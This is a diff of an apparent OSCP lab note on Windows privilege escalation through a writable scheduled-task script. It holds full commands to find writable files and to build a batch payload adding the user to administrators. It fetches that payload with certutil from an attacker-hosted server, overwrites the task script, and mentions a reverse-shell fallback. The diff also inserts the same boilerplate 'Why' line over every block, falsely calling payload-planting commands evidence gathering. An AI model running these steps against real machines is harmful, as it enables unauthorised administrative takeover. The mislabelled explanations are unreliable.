@@ -8,18 +8,21 @@
 
 Check file permissions on task-related directories:
 
+> **Why:** This command gathers the windows scheduled task abuse evidence needed to decide which documented route applies next.
 ```cmd
 icacls C:\ /T 2>nul | findstr "(F)" | findstr /i "users everyone authenticated"
 ```
 
 Read the original script content before touching it:
 
+> **Why:** This command gathers the windows scheduled task abuse evidence needed to decide which documented route applies next.
 ```cmd
 type C:\Log-Management\job.bat
 ```
 
 On Kali, create a payload and restore file:
 
+> **Why:** This command gathers the windows scheduled task abuse evidence needed to decide which documented route applies next.
 ```bash
 echo '@echo off
 net localgroup administrators $Username /add' > $BoxDir/www/payload.bat
@@ -34,6 +37,7 @@ www   # serve $BoxDir/www/ on port 80
 
 On the target, download and replace the script:
 
+> **Why:** This command gathers the windows scheduled task abuse evidence needed to decide which documented route applies next.
 ```cmd
 certutil -urlcache -f http://$LocalIP/payload.bat C:\Users\$Username\payload.bat
 copy /Y C:\Users\$Username\payload.bat C:\Log-Management\job.bat
@@ -42,6 +46,7 @@ type C:\Log-Management\job.bat
 
 Wait up to 5 minutes for the task to fire, then confirm:
 
+> **Why:** This command gathers the windows scheduled task abuse evidence needed to decide which documented route applies next.
 ```cmd
 net localgroup administrators
 ```
@@ -68,14 +73,15 @@ username
 
 ## What did you get?
 
-- [ ] `BUILTIN\Users:(F)` without `(I)` is shown → **This is explicitly set, not inherited — it's the intended attack surface**
+- [ ] `BUILTIN\Users:(F)` without `(I)` is shown → **Run `copy $PayloadPath $TaskPath`, wait for the task trigger, and run `net localgroup administrators` to confirm the result**
 - [ ] No writable script or task found → **Go to Step 32 · [[Windows - Credential Search]]**
-- [ ] Payload in place, waiting → **Check `net localgroup administrators` every 2 minutes**
-- [ ] Username appears in admin group → **Read the root flag, then restore the original script and go to Step 33 · [[Windows - Clean Down]]**
-- [ ] 10 minutes pass with no trigger → **Try a reverse shell payload instead of net localgroup, then revert**
+- [ ] Payload in place, waiting → **Run `timeout /t 120 && net localgroup administrators` every two minutes until `$Username` appears**
+- [ ] Username appears in admin group → **Run `whoami /groups`, restore the original script with the commands below, then go to Step 33 · [[Windows - Clean Down]]**
+- [ ] 10 minutes pass with no trigger → **Replace the file with the documented reverse-shell payload, rerun `copy $PayloadPath $TaskPath`, and revert it after one trigger attempt**
 
 After admin is confirmed, restore the original script:
 
+> **Why:** This command gathers the windows scheduled task abuse evidence needed to decide which documented route applies next.
 ```cmd
 certutil -urlcache -f http://$LocalIP/restore.bat C:\Users\$Username\restore.bat
 copy /Y C:\Users\$Username\restore.bat C:\Log-Management\job.bat
@@ -99,3 +105,19 @@ The scheduled task may not be visible via `schtasks /query` if the current user 
 
 > [!warning] 💡
 > Do not run the original script manually as the unprivileged user. Scripts that check `bcdedit` output for "Access" (the word in "Access denied") will exit immediately on the non-admin branch — and the `exit` at the bottom can close your shell session.
+## Seen in
+- [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]] -- confirmed in the box write-up
+
+## Related stages
+
+- [[Windows - Service Scan]]
+- [[Windows - Web Enum]]
+- [[Windows - SMB Enum]]
+
+## External Resources
+
+- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
+- https://www.revshells.com/
+## Why this matters for OSCP
+
+This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
